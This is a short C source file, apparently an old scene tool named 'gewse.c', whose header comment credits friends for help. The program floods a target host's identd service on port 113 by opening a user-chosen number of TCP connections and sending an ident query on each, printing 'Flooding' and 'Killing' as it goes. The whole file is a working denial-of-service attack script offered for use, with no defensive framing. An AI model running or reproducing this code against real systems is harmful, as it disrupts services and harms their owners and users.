
/* gewse.c by napster..
 * my first attempt at anything so it sucks..
 * werd to Aut0psy, prym, vcx, and djesus fer help...
 * thankz to majikal fer the cool name. =)
 * And oh yeah, NONE of this is ripped....
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>

#define GETIDENT "1027, 6667 : USERID : UNIX : die"

int sockdesc;
int portkill;
int numkill;
int x;

void gewse_usage(char *progname)
{
  printf("gewse.c by napster...\n");
  printf("gewse_usage: %s <host> <# of connex>\n",progname);
  exit(69);
}

gewse_main(int argc, char *argv[])
{
    
 struct sockaddr_in sin;
 struct hostent *he;

 if (argc<3) gewse_usage(argv[0]);
  
 sin.sin_port = htons(113);
 sin.sin_family = AF_INET;
 
 he = gethostbyname(argv[1]);
 if (he) {
   sin.sin_family = AF_INET;
   sin.sin_port = htons(113);
   memcpy((caddr_t)&sin.sin_addr.s_addr, he->h_addr, he->h_length);
 } else {
   perror("resolving");
 }

 numkill  = atoi(argv[2]);

 printf("Flooding %s [%s] identd %d times.\n", argv[1], inet_ntoa(sin.sin_addr.s_addr), numkill);
 printf("Killing");
 fflush(stdout);

 for (x=1;x<=numkill;x++) {

 sockdesc = socket(AF_INET, SOCK_STREAM, 0);

 if (sockdesc < 0) {
  perror("socket");
  exit(69);
 }
  
  if (connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
   perror("connect");
   exit(69);
  }

  printf(" .");
  fflush(stdout);
  (void) write(sockdesc, GETIDENT, strlen(GETIDENT));
 }

 printf("\n");

}
